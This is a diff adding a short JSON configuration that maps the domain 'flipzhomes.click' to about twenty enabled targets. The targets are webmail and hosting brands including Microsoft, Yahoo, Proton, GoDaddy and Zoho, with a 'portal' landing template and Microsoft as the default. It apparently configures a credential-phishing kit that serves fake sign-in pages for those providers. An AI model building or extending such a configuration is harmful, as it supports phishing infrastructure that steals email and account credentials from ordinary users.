@@ -1,0 +1,32 @@
+{
+  "domains": {
+    "flipzhomes.click": {
+      "targets": {
+        "MICROSOFT": true,
+        "fastmail": true,
+        "gmx": true,
+        "godaddy": true,
+        "infomaniak": true,
+        "ionos": true,
+        "mailbox": true,
+        "mailcom": true,
+        "microsoft": true,
+        "msa": true,
+        "namecheap": true,
+        "proton": true,
+        "rackspace": true,
+        "runbox": true,
+        "turbify": true,
+        "tuta": true,
+        "tutanota": true,
+        "webmailza": true,
+        "yahoo": true,
+        "yandex": true,
+        "zoho": true
+      },
+      "landing_template": "portal",
+      "default_target": "microsoft",
+      "enabled": true
+    }
+  }
+}
